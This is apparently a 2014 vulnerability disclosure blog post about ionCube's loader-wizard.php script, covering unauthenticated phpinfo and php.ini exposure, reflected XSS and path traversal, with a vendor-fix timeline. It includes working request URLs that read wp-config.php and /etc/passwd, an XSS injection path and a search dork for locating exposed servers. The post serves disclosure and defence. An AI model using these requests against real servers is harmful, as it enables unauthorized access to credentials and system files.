+++
Description = "Multiple Vulnerabilities in ionCube Loader-wizard"
title = "Multiple Vulnerabilities in ionCube Loader-wizard"
date = "2014-03-30T12:00:00+01:00"
+++

In a recent security audit I spotted a file on the server which caught my attention: `loader-wizard.php`.

After calling the file via a Browser I noticed it's part of ionCubes encoding and [obfuscation](http://en.wikipedia.org/wiki/Obfuscation) software. The software can be found on [ionCubes Homepage](http://www.ioncube.com/php_encoder.php).

<!--more-->

The software compiles your php code into custom bytecode and performs some obfuscation on variable names, class names and so on. This way you can ship your php based product without revealing the original sourcecode. To teach the server how to interpret the encoded format you need to install a seperate ionCube php extension on your server which decrypts the php files at runtime. In my opinion the extra extension is a little bit too much because there can be some vulnerabilities in there too but it looks like many people are using it. The found file `loader-wizard.php` is a little helper script used to detect if the extension is loaded and guide you through the installation process.

The file itself contains many vulnerabilities which are all exploitable with no authentication.

The current loader-wizard.php file can be downloaded for free from [http://www.ioncube.com/loaders.php](http://www.ioncube.com/loaders.php). I only took a look at the loader-wizard.php script available from [http://www.ioncube.com/loader-wizard/loader-wizard.zip](http://www.ioncube.com/loader-wizard/loader-wizard.zip), but maybe someone wants to take a look at the installer script and the extension too.

Doing a quick search on Google using the dork [inurl:loader-wizard.php](https://www.google.com/search?q=inurl%3Aloader-wizard.php) reveals about 34,400 found files. Assuming no one links an installer script they are all found because directory indexing is active so there are probably much more scripts out there. I checked some of the search results with the "phpinfo vulnerability" described below, and all were vulnerable.

I tested the latest version of the loader available for download at the time of writing (2.42) and version 2.36 which is the one I found on the server. All reported vulnerabilities are present in both versions. You can determine the installed version by looking at the footer of the page.

The fixed version is 2.46. Some vulnerabilities like the phpinfo are not fixed because they represent the functionality of the script. Ioncube added a notice on top of every page to remove the file after successful installation.

# phpinfo exposure

When calling the page `phpinfo` the scripts executes `phpinfo()` and presents the contents.

```
http://server.com/loader-wizard.php?page=phpinfo
```

![phpinfo](/img/ioncube/phpinfo.png "phpinfo")

# php.ini exposure

When calling the page `phpconfig` the scripts reads your `php.ini` settings file and prints out all the contents.

```
http://server.com/loader-wizard.php?page=phpconfig
```

![phpconfig](/img/ioncube/phpconfig.png "phpconfig")

# extra information

When calling the page `extra` the scripts outputs some additional informations about the server.

```
http://server.com/loader-wizard.php?page=extra
```

![extra](/img/ioncube/extra.png "extra")

# Download configs as zipped file

When calling the page `system_info_archive` it's possible to download a zip file containing a copy of the `php.ini`, `phpinfo()` output and the extra informations printed on the `extra` page.

```
http://server.com/loader-wizard.php?page=system_info_archive
```

![archive](/img/ioncube/system_info_archive.png "archive")

# reflected XSS

The script uses the PHP variable `$self` in various places. It's possible to inject script code in the script name and thus the script is vulnerable to reflected cross site scripting.

```
http://server.com/loader-wizard.php/%3Cxss%3E
```

The string `<xss>` is printed out unescaped 10 times.

```html
<link rel="stylesheet" type="text/css" href="/loader-wizard.php/<xss>?page=css">
setTimeout("window.location.href = '/loader-wizard.php/<xss>?page=default&amp;timeout=1'",1000);
window.location.href = '/loader-wizard.php/<xss>?page=default';
xmlHttp.open("GET","/loader-wizard.php/<xss>?page=loaderversion",true);
xmlHttp.open("GET","/loader-wizard.php/<xss>?page=platforminfo",true);
xmlHttp.open("GET","/loader-wizard.php/<xss>?page=compilerversion",true);
xmlHttp.open("GET","/loader-wizard.php/<xss>?page=wizardversion",true);
setTimeout("window.location.href = '/loader-wizard.php/<xss>?page=default&amp;timeout=1'",1000);
<a href="/loader-wizard.php/<xss>?page=default">
<a href="/loader-wizard.php/<xss>?page=default&amp;timeout=1">
```

![xss](/img/ioncube/xss.png "xss")

# Get arbitrary file on server

The page `phpconfig` can be abused to download arbitrary files the webserver has access to.

```
http://server.com/loader-wizard.php?page=phpconfig&ininame=../../../../../../../var/www/wordpress/wp-config.php&download=1
```

```
http://server.com/loader-wizard.php?page=phpconfig&ininame=../../../../../../../etc/passwd&download=1
```

![file](/img/ioncube/file.png "file")

## Vulnerable code

You can see you need to set the `download` parameter to supply an own `ininame`. On line 30 the filepath is constructed without sanitizing the filename.

```php
function phpconfig_page()
{
    info_disabled_check();
    $sys = get_sysinfo();
    $download = get_request_parameter('download');
    $ini_file_name = '';
    if (!empty($download)) {
        $ini_file_name = get_request_parameter('ininame');
        if (empty($ini_file_name)) {
            $ini_file_name = ini_file_name();
        }
        header('Content-Type: text/plain');
        header('Content-Disposition: attachment; filename=' . $ini_file_name);
    } else {
        header('Content-Type: text/plain');
    }
    $exclude_original = get_request_parameter('newlinesonly');
    $prepend = get_request_parameter('prepend');
    $stype = get_request_parameter('stype');
    $server_type = find_server_type($stype);
    if (!empty($exclude_original) || !empty($prepend)) {
        $loader_dir = loader_install_dir($server_type);
        $zend_lines = zend_extension_lines($loader_dir);
        echo join(PHP_EOL,$zend_lines);
        echo PHP_EOL;
    }
    if (empty($ini_file_name) || empty($sys['PHP_INI_DIR']) || ($sys['PHP_INI_BASENAME'] == $ini_file_name)) {
        $original_ini_file = isset($sys['PHP_INI'])?$sys['PHP_INI']:'';
    } else {
        $original_ini_file = $sys['PHP_INI_DIR'] . DIRECTORY_SEPARATOR . $ini_file_name;
    }
    if (empty($exclude_original) && !empty($original_ini_file) && @file_exists($original_ini_file)) {
        if (!empty($download)) {
            @readfile($original_ini_file);
        } else {
            echo all_ini_contents();
        }
    }
}
```

# Timeline

02.03.2014 - Contacted Vendor

02.03.2014 - Response from vendor, will be fixed asap

04.03.2014 - Fixed version released (2.46)

30.03.2014 - Blog post published
